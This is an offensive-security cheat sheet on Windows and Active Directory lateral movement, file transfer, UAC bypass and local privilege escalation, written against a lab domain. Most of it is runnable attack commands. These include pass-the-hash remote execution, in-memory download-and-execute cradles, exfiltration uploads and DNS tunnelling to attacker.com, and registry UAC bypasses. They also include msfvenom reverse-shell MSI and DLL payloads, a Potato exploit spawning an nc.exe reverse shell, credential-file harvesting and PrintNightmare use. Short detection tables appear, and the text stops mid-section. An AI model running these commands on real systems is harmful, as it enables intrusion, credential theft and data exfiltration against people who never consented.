# Lateral Movement & Privilege Escalation - Complete Guide

A comprehensive guide to lateral movement, privilege escalation, UAC bypass, file transfers, and useful techniques for moving around Windows/Active Directory environments.

---

## Table of Contents

1. [Lateral Movement Overview](#lateral-movement-overview)
2. [Remote Execution Methods](#remote-execution-methods)
3. [File Transfer Techniques](#file-transfer-techniques)
4. [UAC Bypass Techniques](#uac-bypass-techniques)
5. [Local Privilege Escalation](#local-privilege-escalation)
6. [Credential Access](#credential-access)
7. [Token Manipulation](#token-manipulation)
8. [Living Off the Land (LOLBins)](#living-off-the-land-lolbins)
9. [Persistence Techniques](#persistence-techniques)
10. [Defense Evasion](#defense-evasion)
11. [Useful Tools & Projects](#useful-tools--projects)
12. [Blue Team Detection](#blue-team-detection)

---

# Lateral Movement Overview

## What is Lateral Movement?

Moving from one compromised system to another within a network to:
- Access additional resources
- Find higher-privileged credentials
- Reach target systems (DC, file servers, etc.)
- Expand access footprint

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         Lateral Movement Attack Flow                         │
└─────────────────────────────────────────────────────────────────────────────┘

┌──────────┐    Compromise    ┌──────────┐    Credential    ┌──────────┐
│ Initial  │ ──────────────> │  First   │ ──────────────> │  Second  │
│  Access  │                  │   Host   │    Harvesting    │   Host   │
└──────────┘                  └──────────┘                  └──────────┘
                                   │                            │
                                   ▼                            ▼
                              ┌──────────┐                ┌──────────┐
                              │  Dump    │                │  Higher  │
                              │  Creds   │                │  Privs   │
                              └──────────┘                └──────────┘
                                   │                            │
                                   └───────────┬────────────────┘
                                               ▼
                                         ┌──────────┐
                                         │  Domain  │
                                         │ Controller│
                                         └──────────┘
```

---

# Remote Execution Methods

## 1. PsExec / SMB Exec

### Concept
Execute commands on remote systems using SMB and the Windows Service Control Manager.

### Requirements
- Admin credentials on target
- SMB (445) accessible
- Admin$ share available

### Methods

**Impacket psexec.py**
```bash
# Execute command
psexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 cmd.exe

# Execute with hash (Pass-the-Hash)
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 AKATSUKI/itachi@192.168.56.11

# Execute specific command
psexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami /all"
```

**Impacket smbexec.py (stealthier)**
```bash
# Uses a temporary service, less artifacts
smbexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11

# Semi-interactive shell
smbexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11
```

**Impacket atexec.py (Task Scheduler)**
```bash
# Uses Task Scheduler instead of services
atexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami"
```

**Sysinternals PsExec**
```powershell
# From Windows
PsExec.exe \\192.168.56.11 -u AKATSUKI\itachi -p Akatsuki123! cmd.exe

# Run as SYSTEM
PsExec.exe \\192.168.56.11 -u AKATSUKI\itachi -p Akatsuki123! -s cmd.exe

# Copy program and execute
PsExec.exe \\192.168.56.11 -u AKATSUKI\itachi -p Akatsuki123! -c evil.exe
```

**CrackMapExec**
```bash
# Execute command via various methods
crackmapexec smb 192.168.56.11 -u itachi -p 'Akatsuki123!' -x "whoami"

# PowerShell command
crackmapexec smb 192.168.56.11 -u itachi -p 'Akatsuki123!' -X "Get-Process"

# Execute on multiple hosts
crackmapexec smb 192.168.56.0/24 -u itachi -p 'Akatsuki123!' -x "whoami"
```

### Blue Team Detection
| Event ID | Description |
|----------|-------------|
| 7045 | Service installed (PSEXESVC) |
| 4697 | Service installed |
| 4624 | Logon Type 3 from unexpected source |
| 5145 | Share access to ADMIN$, C$, IPC$ |

---

## 2. WMI (Windows Management Instrumentation)

### Concept
Execute commands remotely via WMI protocol.

### Requirements
- Admin credentials
- WMI/DCOM accessible (135, 445)
- WMI service running

### Methods

**Impacket wmiexec.py**
```bash
# Semi-interactive shell via WMI
wmiexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11

# Pass-the-Hash
wmiexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11

# Execute single command
wmiexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami"
```

**PowerShell (from Windows)**
```powershell
# Create credential object
$cred = New-Object System.Management.Automation.PSCredential("AKATSUKI\itachi", (ConvertTo-SecureString "Akatsuki123!" -AsPlainText -Force))

# Execute command via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt" -ComputerName 192.168.56.11 -Credential $cred

# Using CIM (newer)
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="notepad.exe"} -ComputerName 192.168.56.11 -Credential $cred
```

**wmic.exe (built-in)**
```cmd
# Execute process on remote system
wmic /node:192.168.56.11 /user:AKATSUKI\itachi /password:Akatsuki123! process call create "cmd.exe /c whoami > C:\output.txt"

# Query processes
wmic /node:192.168.56.11 /user:AKATSUKI\itachi /password:Akatsuki123! process list brief
```

**CrackMapExec WMI**
```bash
crackmapexec wmi 192.168.56.11 -u itachi -p 'Akatsuki123!' -x "whoami"
```

### Blue Team Detection
| Event ID | Description |
|----------|-------------|
| 4648 | Explicit credential logon |
| 4624 | Type 3 logon |
| WMI-Activity/Operational | WMI activity logs |

---

## 3. WinRM (Windows Remote Management)

### Concept
PowerShell remoting over HTTP/HTTPS (5985/5986).

### Requirements
- Admin credentials
- WinRM enabled on target
- Ports 5985 (HTTP) or 5986 (HTTPS)

### Methods

**Evil-WinRM (Kali)**
```bash
# Basic connection
evil-winrm -i 192.168.56.11 -u itachi -p 'Akatsuki123!'

# Pass-the-Hash
evil-winrm -i 192.168.56.11 -u itachi -H NTHASH

# With SSL
evil-winrm -i 192.168.56.11 -u itachi -p 'Akatsuki123!' -S

# Upload/Download files
*Evil-WinRM* PS> upload /path/to/local/file C:\path\on\target
*Evil-WinRM* PS> download C:\path\on\target /path/to/local/file

# Load PowerShell scripts
evil-winrm -i 192.168.56.11 -u itachi -p 'Akatsuki123!' -s /path/to/scripts/
*Evil-WinRM* PS> Invoke-Mimikatz.ps1
```

**PowerShell (from Windows)**
```powershell
# Enable WinRM on attacker machine
Enable-PSRemoting -Force

# Create session
$cred = Get-Credential  # or use PSCredential object
$session = New-PSSession -ComputerName 192.168.56.11 -Credential $cred

# Enter interactive session
Enter-PSSession -ComputerName 192.168.56.11 -Credential $cred

# Execute command remotely
Invoke-Command -ComputerName 192.168.56.11 -Credential $cred -ScriptBlock { whoami }

# Execute on multiple hosts
Invoke-Command -ComputerName 192.168.56.11,192.168.56.12 -Credential $cred -ScriptBlock { hostname }

# Copy files via session
Copy-Item -Path C:\local\file.txt -Destination C:\remote\file.txt -ToSession $session
```

**CrackMapExec WinRM**
```bash
crackmapexec winrm 192.168.56.11 -u itachi -p 'Akatsuki123!' -x "whoami"
crackmapexec winrm 192.168.56.11 -u itachi -p 'Akatsuki123!' -X "Get-Process"
```

### Blue Team Detection
| Event ID | Description |
|----------|-------------|
| 4624 | Type 3 logon |
| 4648 | Explicit credential logon |
| 91 | WSMan session created |
| Microsoft-Windows-WinRM/Operational | WinRM activity |

---

## 4. RDP (Remote Desktop Protocol)

### Concept
Full GUI access to remote system.

### Requirements
- Valid credentials (admin or RDP-enabled user)
- RDP enabled (3389)
- User in Remote Desktop Users group

### Methods

**From Linux**
```bash
# xfreerdp
xfreerdp /v:192.168.56.11 /u:AKATSUKI\\itachi /p:'Akatsuki123!' /cert:ignore

# With drive sharing (file transfer)
xfreerdp /v:192.168.56.11 /u:AKATSUKI\\itachi /p:'Akatsuki123!' /drive:share,/tmp/

# Restricted Admin mode (Pass-the-Hash)
xfreerdp /v:192.168.56.11 /u:itachi /pth:NTHASH /cert:ignore

# rdesktop
rdesktop -u itachi -p 'Akatsuki123!' -d AKATSUKI 192.168.56.11
```

**From Windows**
```cmd
# Standard RDP
mstsc /v:192.168.56.11

# Cmdkey for credential storage
cmdkey /add:192.168.56.11 /user:AKATSUKI\itachi /pass:Akatsuki123!
mstsc /v:192.168.56.11

# SharpRDP (command execution via RDP without GUI)
SharpRDP.exe computername=192.168.56.11 command="whoami" username=AKATSUKI\itachi password=Akatsuki123!
```

**Enable RDP Remotely**
```powershell
# Via registry (requires admin access another way)
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

# Enable via WMI
wmic /node:192.168.56.11 /user:AKATSUKI\itachi /password:Akatsuki123! rdtoggle where AllowTSConnections=0 call SetAllowTSConnections 1

# Enable via PowerShell
Invoke-Command -ComputerName 192.168.56.11 -Credential $cred -ScriptBlock {
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
}
```

### Restricted Admin Mode (RDP PtH)
```powershell
# Enable on target (requires admin)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0

# Connect with hash
sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:HASH /run:"mstsc.exe /restrictedadmin"
```

### Blue Team Detection
| Event ID | Description |
|----------|-------------|
| 4624 | Type 10 logon (RemoteInteractive) |
| 4778 | Session reconnected |
| 4779 | Session disconnected |
| 21/22/23/24/25 | TerminalServices-LocalSessionManager |

---

## 5. DCOM (Distributed Component Object Model)

### Concept
Execute commands via DCOM objects like MMC20.Application, ShellWindows, etc.

### Requirements
- Admin credentials
- DCOM accessible (135 + dynamic ports)

### Methods

**Impacket dcomexec.py**
```bash
# Using MMC20.Application
dcomexec.py -object MMC20 AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami"

# Using ShellWindows
dcomexec.py -object ShellWindows AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami"

# Using ShellBrowserWindow
dcomexec.py -object ShellBrowserWindow AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami"
```

**PowerShell DCOM**
```powershell
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.56.11"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\output.txt","7")

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","192.168.56.11"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\output.txt","C:\Windows\System32",$null,0)

# Excel.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","192.168.56.11"))
$com.DDEInitiate("cmd","/c whoami > C:\output.txt")
```

### Blue Team Detection
| Event ID | Description |
|----------|-------------|
| 4648 | Explicit credential logon |
| Sysmon 3 | Network connection to DCOM |
| DCOM logs | Application-specific |

---

## 6. SSH (if available)

### Concept
Use SSH for lateral movement if OpenSSH is installed.

### Methods
```bash
# Basic SSH
ssh itachi@192.168.56.11

# With password
sshpass -p 'Akatsuki123!' ssh itachi@192.168.56.11

# Execute command
ssh itachi@192.168.56.11 "whoami"

# Port forwarding
ssh -L 8080:10.0.0.5:80 itachi@192.168.56.11

# Dynamic SOCKS proxy
ssh -D 1080 itachi@192.168.56.11
```

---

## 7. Scheduled Tasks

### Concept
Create scheduled tasks on remote systems for execution.

### Methods

**schtasks.exe**
```cmd
# Create remote task
schtasks /create /s 192.168.56.11 /u AKATSUKI\itachi /p Akatsuki123! /tn "EvilTask" /tr "cmd.exe /c whoami > C:\output.txt" /sc once /st 00:00 /ru SYSTEM

# Run the task
schtasks /run /s 192.168.56.11 /u AKATSUKI\itachi /p Akatsuki123! /tn "EvilTask"

# Delete the task
schtasks /delete /s 192.168.56.11 /u AKATSUKI\itachi /p Akatsuki123! /tn "EvilTask" /f
```

**PowerShell**
```powershell
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\output.txt"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName "EvilTask" -Action $action -Trigger $trigger -Principal $principal -CimSession (New-CimSession -ComputerName 192.168.56.11 -Credential $cred)
```

### Blue Team Detection
| Event ID | Description |
|----------|-------------|
| 4698 | Scheduled task created |
| 4699 | Scheduled task deleted |
| 4700/4701 | Task enabled/disabled |
| 106 | Task-Scheduler/Operational |

---

## 8. Service Creation

### Concept
Create or modify services on remote systems.

### Methods

**sc.exe**
```cmd
# Create service
sc \\192.168.56.11 create EvilSvc binPath= "cmd.exe /c whoami > C:\output.txt" start= demand

# Start service
sc \\192.168.56.11 start EvilSvc

# Delete service
sc \\192.168.56.11 delete EvilSvc
```

**PowerShell**
```powershell
Invoke-Command -ComputerName 192.168.56.11 -Credential $cred -ScriptBlock {
    New-Service -Name "EvilSvc" -BinaryPathName "cmd.exe /c whoami > C:\output.txt"
    Start-Service -Name "EvilSvc"
}
```

### Blue Team Detection
| Event ID | Description |
|----------|-------------|
| 7045 | Service installed |
| 4697 | Service installed |
| 7034 | Service crashed (if binary fails) |

---

# File Transfer Techniques

## 1. SMB File Transfers

```bash
# From Kali - Copy to target
smbclient //192.168.56.11/C$ -U 'AKATSUKI\itachi%Akatsuki123!' -c "put payload.exe Windows\Temp\payload.exe"

# From Kali - Copy from target
smbclient //192.168.56.11/C$ -U 'AKATSUKI\itachi%Akatsuki123!' -c "get Windows\Temp\secrets.txt"

# Mount share
mount -t cifs //192.168.56.11/C$ /mnt/share -o username=itachi,password='Akatsuki123!',domain=AKATSUKI

# Impacket smbclient
smbclient.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11
```

```powershell
# From Windows - Copy to target
copy C:\payload.exe \\192.168.56.11\C$\Windows\Temp\payload.exe

# From Windows - Copy from target
copy \\192.168.56.11\C$\Windows\Temp\secrets.txt C:\

# Using credentials
net use \\192.168.56.11\C$ /user:AKATSUKI\itachi Akatsuki123!
copy C:\payload.exe \\192.168.56.11\C$\Windows\Temp\
net use \\192.168.56.11\C$ /delete

# PowerShell with credentials
$cred = Get-Credential
New-PSDrive -Name "X" -PSProvider FileSystem -Root "\\192.168.56.11\C$" -Credential $cred
Copy-Item C:\payload.exe X:\Windows\Temp\
Remove-PSDrive X
```

## 2. HTTP/HTTPS Downloads

**From Attacker - Start Server**
```bash
# Python HTTP server
python3 -m http.server 8080

# Python with upload capability
pip install uploadserver
python3 -m uploadserver 8080

# PHP server
php -S 0.0.0.0:8080
```

**On Target - Download**
```powershell
# PowerShell - Invoke-WebRequest
Invoke-WebRequest -Uri http://192.168.56.100:8080/payload.exe -OutFile C:\Windows\Temp\payload.exe
iwr http://192.168.56.100:8080/payload.exe -OutFile C:\Windows\Temp\payload.exe

# PowerShell - WebClient
(New-Object Net.WebClient).DownloadFile('http://192.168.56.100:8080/payload.exe','C:\Windows\Temp\payload.exe')

# PowerShell - Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.100:8080/script.ps1')
IEX (iwr http://192.168.56.100:8080/script.ps1 -UseBasicParsing).Content

# certutil
certutil -urlcache -split -f http://192.168.56.100:8080/payload.exe C:\Windows\Temp\payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://192.168.56.100:8080/payload.exe C:\Windows\Temp\payload.exe

# curl (Windows 10+)
curl http://192.168.56.100:8080/payload.exe -o C:\Windows\Temp\payload.exe

# wget (if available)
wget http://192.168.56.100:8080/payload.exe -O C:\Windows\Temp\payload.exe
```

```cmd
# cmd - certutil
certutil -urlcache -split -f http://192.168.56.100:8080/payload.exe payload.exe

# cmd - bitsadmin
bitsadmin /transfer n http://192.168.56.100:8080/payload.exe C:\Windows\Temp\payload.exe
```

## 3. HTTP Upload (Exfiltration)

**Attacker Server**
```bash
# Python uploadserver
python3 -m uploadserver 8080

# Or simple POST handler
python3 << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = self.rfile.read(content_length)
        with open('uploaded_file', 'wb') as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
EOF
```

**From Target**
```powershell
# PowerShell upload
Invoke-WebRequest -Uri http://192.168.56.100:8080/upload -Method POST -InFile C:\secrets.txt

# WebClient
$wc = New-Object System.Net.WebClient
$wc.UploadFile("http://192.168.56.100:8080/upload", "C:\secrets.txt")

# Invoke-RestMethod
Invoke-RestMethod -Uri http://192.168.56.100:8080/upload -Method POST -InFile C:\secrets.txt
```

## 4. FTP Transfers

**Attacker Server**
```bash
# Python FTP server
pip install pyftpdlib
python3 -m pyftpdlib -p 21 -w  # Anonymous write access
```

**From Target**
```cmd
# Create FTP script
echo open 192.168.56.100 > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get payload.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

```powershell
# PowerShell FTP
$ftp = [System.Net.FtpWebRequest]::Create("ftp://192.168.56.100/payload.exe")
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::DownloadFile
$response = $ftp.GetResponse()
$reader = $response.GetResponseStream()
$writer = [System.IO.File]::Create("C:\Windows\Temp\payload.exe")
$reader.CopyTo($writer)
$writer.Close()
```

## 5. Base64 Encoding Transfer

**Encode on Attacker**
```bash
# Linux
base64 -w0 payload.exe > payload.b64
cat payload.b64  # Copy output
```

**Decode on Target**
```powershell
# PowerShell
$encoded = "BASE64_STRING_HERE"
[IO.File]::WriteAllBytes("C:\Windows\Temp\payload.exe", [Convert]::FromBase64String($encoded))

# certutil decode
echo BASE64_STRING_HERE > encoded.txt
certutil -decode encoded.txt payload.exe
```

## 6. BITS (Background Intelligent Transfer Service)

```powershell
# Download
Start-BitsTransfer -Source "http://192.168.56.100:8080/payload.exe" -Destination "C:\Windows\Temp\payload.exe"

# Upload
Start-BitsTransfer -Source "C:\secrets.txt" -Destination "http://192.168.56.100:8080/upload" -TransferType Upload

# Asynchronous (stealthy)
$job = Start-BitsTransfer -Source "http://192.168.56.100:8080/payload.exe" -Destination "C:\Windows\Temp\payload.exe" -Asynchronous
while (($job.JobState -eq "Transferring") -or ($job.JobState -eq "Connecting")) { Sleep 1 }
Complete-BitsTransfer -BitsJob $job
```

## 7. DNS Exfiltration

```bash
# On attacker - Start DNS server
sudo python3 dnscat2-server.py tunnel.attacker.com

# On target - exfiltrate via DNS
dnscat2.exe tunnel.attacker.com

# Or manual via nslookup
for /f "tokens=*" %a in (secrets.txt) do nslookup %a.attacker.com
```

## 8. PowerShell Remoting File Transfer

```powershell
# Create session
$session = New-PSSession -ComputerName 192.168.56.11 -Credential $cred

# Copy to remote
Copy-Item -Path C:\payload.exe -Destination C:\Windows\Temp\ -ToSession $session

# Copy from remote
Copy-Item -Path C:\Windows\Temp\secrets.txt -Destination C:\ -FromSession $session

# Remove session
Remove-PSSession $session
```

---

# UAC Bypass Techniques

## Understanding UAC

User Account Control (UAC) is a security feature that:
- Prompts for consent/credentials for admin tasks
- Runs most applications as standard user even for admin accounts
- Protects against unauthorized system changes

**UAC Integrity Levels:**
| Level | Description |
|-------|-------------|
| Low | Sandboxed processes (IE) |
| Medium | Standard user (default) |
| High | Elevated administrator |
| System | System services |

## 1. Fodhelper UAC Bypass

### Concept
Abuse auto-elevated Microsoft signed binary `fodhelper.exe` by hijacking registry keys.

### Method
```powershell
# Create registry key
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "cmd.exe /c start powershell.exe" -Force

# Trigger fodhelper
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

### One-liner
```powershell
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force; Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" "(default)" "cmd /c start powershell" -Force; New-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" "DelegateExecute" "" -Force; Start-Process fodhelper.exe -WindowStyle Hidden; Start-Sleep 3; Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

## 2. Eventvwr UAC Bypass

### Concept
Similar to fodhelper, abuses `eventvwr.exe` which queries `HKCU\Software\Classes\mscfile\shell\open\command`.

### Method
```powershell
# Create registry key
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c start powershell.exe" -Force

# Trigger eventvwr
Start-Process "C:\Windows\System32\eventvwr.exe" -WindowStyle Hidden

# Cleanup
Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force
```

## 3. ComputerDefaults UAC Bypass

### Method
```powershell
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "cmd.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force

Start-Process "C:\Windows\System32\ComputerDefaults.exe"

Start-Sleep 2
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

## 4. Sdclt UAC Bypass (Windows 10)

### Method
```powershell
# Version 1 - App Paths
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Name "(default)" -Value "cmd.exe" -Force
Start-Process "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden
Start-Sleep 3
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Recurse -Force

# Version 2 - IsolatedCommand
New-Item -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(default)" -Value "cmd.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\sdclt.exe" /kickoffelev
```

## 5. SilentCleanup UAC Bypass

### Concept
Abuses scheduled task that runs with high integrity.

### Method
```powershell
# Check the task
schtasks /query /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup"

# Set environment variable for bypass
$env:windir = "cmd.exe /c start powershell.exe && REM "
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

## 6. CMSTP UAC Bypass

### Concept
Abuses `cmstp.exe` (Connection Manager Profile Installer).

### Method
```powershell
# Create INF file
$inf = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
cmd.exe /c powershell.exe
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="VPN"
ShortSvcName="VPN"
"@

$inf | Out-File -FilePath "C:\Windows\Temp\bypass.inf"

# Execute (requires user interaction to click OK)
cmstp.exe /s /ns C:\Windows\Temp\bypass.inf
```

## 7. DiskCleanup UAC Bypass

```powershell
# Set PATH hijack
$env:windir = "cmd /c start powershell &&"
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I
```

## 8. Using UACME Project

```bash
# UACME - Collection of UAC bypasses
# https://github.com/hfiref0x/UACME

# Akagi64.exe [method_number]
Akagi64.exe 23  # fodhelper
Akagi64.exe 33  # sdclt
Akagi64.exe 61  # computerdefaults
```

## UAC Bypass Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Registry | Modifications to HKCU\Software\Classes |
| Process Creation | Auto-elevated binaries spawning cmd/powershell |
| Parent-Child | Unusual parent-child relationships |
| Sysmon 1 | Process creation with elevated token |
| Sysmon 13 | Registry value set |

---

# Local Privilege Escalation

## 1. Service Misconfigurations

### Unquoted Service Path
```powershell
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | Select Name, PathName, StartMode

# Exploit: Place executable in path gap
# If path is: C:\Program Files\Vuln Service\service.exe
# Create: C:\Program.exe or C:\Program Files\Vuln.exe
```

### Weak Service Permissions
```powershell
# Check service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *

# Using PowerUp
. .\PowerUp.ps1
Get-ModifiableService

# If writable, change binary path
sc config VulnService binpath= "C:\Windows\Temp\payload.exe"
sc stop VulnService
sc start VulnService
```

### Weak Service Binary Permissions
```powershell
# Check binary permissions
icacls "C:\Program Files\VulnService\service.exe"

# If writable, replace the binary
copy C:\Windows\Temp\payload.exe "C:\Program Files\VulnService\service.exe"
sc stop VulnService
sc start VulnService
```

## 2. Registry AutoRun

```powershell
# Check AutoRun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions on AutoRun binaries
accesschk.exe /accepteula -wvu "C:\Program Files\AutoRun\program.exe"

# If writable, replace or add entry
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "C:\Windows\Temp\payload.exe"
```

## 3. AlwaysInstallElevated

```powershell
# Check if enabled (both must be 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If enabled, create MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f msi > evil.msi

# Install MSI (will run as SYSTEM)
msiexec /quiet /qn /i evil.msi
```

## 4. Stored Credentials

```powershell
# Check stored credentials
cmdkey /list

# If credentials found, use runas
runas /savecred /user:AKATSUKI\itachi cmd.exe

# Search for credentials in files
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# Common credential locations
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\sysprep\sysprep.xml
type C:\Windows\System32\sysprep\Unattend.xml

# IIS config
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# PowerShell history
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear
```

## 5. Scheduled Tasks

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v

# Check writable task binaries
accesschk.exe /accepteula -wvu "C:\task\binary.exe"

# If writable, replace binary
copy C:\Windows\Temp\payload.exe "C:\task\binary.exe"
```

## 6. DLL Hijacking

```powershell
# Find missing DLLs using Process Monitor
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Common locations:
# 1. Application directory
# 2. C:\Windows\System32
# 3. C:\Windows\System
# 4. C:\Windows
# 5. Current directory
# 6. PATH directories

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f dll > evil.dll

# Place in search path before legitimate DLL
```

## 7. Token Impersonation (Potato Attacks)

```powershell
# Check current privileges
whoami /priv

# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege:

# JuicyPotato (Windows Server 2019 and earlier)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe 192.168.56.100 4444 -e cmd.exe" -t *

# PrintSpoofer (Windows 10/Server 2019)
PrintSpoofer.exe -i -c cmd.exe

# GodPotato (newer)
GodPotato.exe -cmd "cmd /c whoami"

# SweetPotato
SweetPotato.exe -a "cmd /c whoami"

# RoguePotato
RoguePotato.exe -r 192.168.56.100 -e "cmd /c whoami" -l 9999
```

## 8. Kernel Exploits

```powershell
# Check system info
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Use Windows Exploit Suggester
./windows-exploit-suggester.py --database 2024-01-01-mssb.xlsx --systeminfo systeminfo.txt

# Common exploits:
# MS16-032 - Secondary Logon (requires 2+ CPUs)
# MS15-051 - Win32k
# CVE-2021-1732 - Win32k
# CVE-2021-36934 - HiveNightmare/SeriousSAM
# CVE-2022-21882 - Win32k
```

## 9. PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

```powershell
# Check if vulnerable
Get-Service Spooler

# Check if Point and Print restrictions are set
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

# Exploit (local privilege escalation version)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!"

# Or add existing user to admins
